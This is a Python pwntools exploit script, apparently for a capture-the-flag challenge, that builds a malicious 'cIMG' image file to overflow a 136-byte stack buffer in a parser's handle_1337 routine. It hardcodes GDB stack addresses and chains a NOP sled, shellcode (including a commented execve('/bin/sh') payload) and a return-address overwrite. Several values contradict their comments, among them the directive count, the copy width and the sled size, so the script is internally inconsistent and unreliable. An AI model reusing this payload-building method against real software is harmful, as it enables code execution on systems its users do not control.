#!/usr/bin/env python3

from pwn import *
import struct

# Set the architecture and endianness
context.arch = 'amd64'
context.endian = 'little'

# === Configuration based on GDB findings ===
SPRITE_ID = 0
# Use smaller dimensions for the actual sprite data
SPRITE_WIDTH = 176  
SPRITE_HEIGHT = 1
SPRITE_FILENAME = b"sprite.bin"

# Stack addresses from your GDB analysis
STACK_BUFFER_START = 0x7fffffffdc30   # Buffer starts here
RETURN_ADDR_LOCATION = 0x7fffffffdcd8 # Return address is here
RET_OFFSET = RETURN_ADDR_LOCATION - STACK_BUFFER_START  # = 168 bytes
STACK_SHELLCODE_ADDR = STACK_BUFFER_START + 64  # Place shellcode after NOP sled

print(f"[+] Buffer starts at: {hex(STACK_BUFFER_START)}")
print(f"[+] Return address at: {hex(RETURN_ADDR_LOCATION)}")
print(f"[+] Return address offset: {RET_OFFSET} bytes")
print(f"[+] Shellcode target address: {hex(STACK_SHELLCODE_ADDR)}")

# === Build shellcode payload ===
with open("shellcode.bin", "rb") as f:
    shellcode = f.read()
# Shellcode for execve("/bin/sh", NULL, NULL)
"""
shellcode = b''.join([
    b"\xcc",	
    b"\x48\x31\xc0",  # xor rax, rax
    b"\x48\x31\xd2",  # xor rdx, rdx
    b"\x48\x31\xf6",  # xor rsi, rsi
    b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00",  # mov rbx, "/bin/sh\x00"
    b"\x53",  # push rbx
    b"\x48\x89\xe7",  # mov rdi, rsp
    b"\xb0\x3b",  # mov al, 0x3b (execve syscall number)
    b"\x0f\x05"  # syscall
])
"""
print(f"[+] Shellcode size: {len(shellcode)} bytes")

# === Key Insight: handle_1337 vulnerability analysis ===
# handle_1337 reads from framebuffer and copies to stack buffer local_a8[136]
# The copy loop uses sprite dimensions from the control bytes:
# - local_aa = width (from byte 4 of control)
# - bStack_a9 = height (from byte 3 of control) 
# - Data is copied row by row: puVar3[lVar1] where lVar1 goes from 0 to width-1
# - Then puVar3 advances by width bytes for next row

# === Build payload for sprite file ===
# The sprite will be transformed by handle_4 before reaching handle_1337
# We need to create a payload that survives the transformation

# NOP sled (64 bytes) + shellcode + padding to return address + return address overwrite
nop_sled = b"\x90" * 16
shellcode_section = shellcode
padding_to_ret = b"\x90" * (RET_OFFSET - len(shellcode_section))
return_address_overwrite = p64(STACK_BUFFER_START)

# Build the overflow payload
overflow_payload = padding_to_ret + shellcode_section + return_address_overwrite 

# The sprite itself should be smaller - we'll control overflow via handle_1337 dimensions
sprite_payload = nop_sled + shellcode_section

# Pad sprite to its declared dimensions
TOTAL_SPRITE_SIZE = SPRITE_WIDTH * SPRITE_HEIGHT
if len(sprite_payload) < TOTAL_SPRITE_SIZE:
    padding_needed = TOTAL_SPRITE_SIZE - len(sprite_payload)
    sprite_payload += b" " * padding_needed  # Use spaces (0x20) for validation
elif len(sprite_payload) > TOTAL_SPRITE_SIZE:
    print("[-] ERROR: Payload too large for sprite dimensions")
    exit(1)

print(f"[+] Sprite payload size: {len(sprite_payload)} bytes")
print(f"[+] Overflow payload size: {len(overflow_payload)} bytes")

# Write sprite file
with open(SPRITE_FILENAME, "wb") as f:
    f.write(overflow_payload)

# === Build CIMG file ===

# Header: "cIMG" + version(2) + width(1) + height(1) + num_directives(4)
# Based on main() decompilation: local_1030 (magic), local_102c (version), param_1+6/7 (width/height), local_1028 (directive counter)
header_width = 176  # This sets the framebuffer dimensions
header_height = 1
num_directives = 3  # We have 4 directives: handle_5, handle_4, handle_1337, handle_6
header = b"cIMG" + struct.pack("<H", 4) + struct.pack("<BB", header_width, header_height) + struct.pack("<I", num_directives)

# === Directive 5: Load sprite from file ===
directive_5 = struct.pack("<H", 5)  # handle_5 code
handle_5_data = (
    struct.pack("B", SPRITE_ID) +           # sprite_id
    struct.pack("B", SPRITE_WIDTH) +        # width
    struct.pack("B", SPRITE_HEIGHT) +       # height
    SPRITE_FILENAME.ljust(0xFF, b"\x00")    # filename (padded to expected size)
)

# === Directive 4: Render sprite to framebuffer ===
directive_4 = struct.pack("<H", 4)  # handle_4 code
render_record = struct.pack("BBBBBBBBB",
    SPRITE_ID,     # sprite index
    0, 0, 0,       # r, g, b colors
    0, 0,          # x, y position
    1,  # width repeater
    1, # height repeater
    0              # unused byte
)

# === Directive 1337: Copy framebuffer to stack (VULNERABILITY) ===
directive_1337 = struct.pack("<H", 1337)  # handle_1337 code

# CRITICAL: These dimensions control the buffer overflow
# handle_1337 will copy width * height bytes from framebuffer to stack buffer
# We need: width * height = 176 (to reach return address + 8 bytes to overwrite it)
# Your analysis: 168 bytes to return address + 8 bytes for address = 176 total

control_width = 174   # Copy exactly enough bytes to overwrite return address
control_height = 1    # Single row

print(f"[+] Control copy dimensions: {control_width}x{control_height} = {control_width * control_height} bytes")
print(f"[+] This will copy {control_width * control_height - 136} bytes beyond the 136-byte stack buffer")

control_bytes = struct.pack("BBBBB",
    SPRITE_ID,      # sprite_id 
    0,              # x offset into framebuffer
    0,              # y offset into framebuffer
    control_width,  # width - CRITICAL FOR OVERFLOW (176 bytes)
    control_height  # height - keep at 1 for single row
)


# === Build final CIMG file ===
exploit_data = (
    header +
    directive_5 + handle_5_data +
    directive_4 + render_record +
    directive_1337 + control_bytes 
)

with open("exploit.cimg", "wb") as f:
    f.write(exploit_data)

print("[+] Created 'exploit.cimg'")
print(f"[+] Total exploit size: {len(exploit_data)} bytes")
print(f"[+] Shellcode will be at: {hex(STACK_SHELLCODE_ADDR)}")
print(f"[+] Return address will be overwritten with: {hex(STACK_SHELLCODE_ADDR)}")
print("\n[!] Exploit ready - the buffer overflow is precisely controlled:")
print(f"    - Stack buffer: 136 bytes")
print(f"    - Return address offset: {RET_OFFSET} bytes") 
print(f"    - Copy dimensions: {control_width}x{control_height} = {control_width * control_height} bytes")
print(f"    - Overflow: {control_width * control_height - 136} bytes beyond buffer")

# === Debug information ===
print(f"\n[DEBUG] Sprite dimensions: {SPRITE_WIDTH}x{SPRITE_HEIGHT} = {TOTAL_SPRITE_SIZE} bytes")
print(f"[DEBUG] Control copy dimensions: {control_width}x{control_height} = {control_width * control_height} bytes")
print(f"[DEBUG] Stack buffer size: 136 bytes")
print(f"[DEBUG] OVERFLOW: Will copy {control_width * control_height - 136} extra bytes")
print(f"[DEBUG] Header framebuffer dimensions: {header_width}x{header_height}")
print(f"[DEBUG] Number of directives in header: {num_directives}")
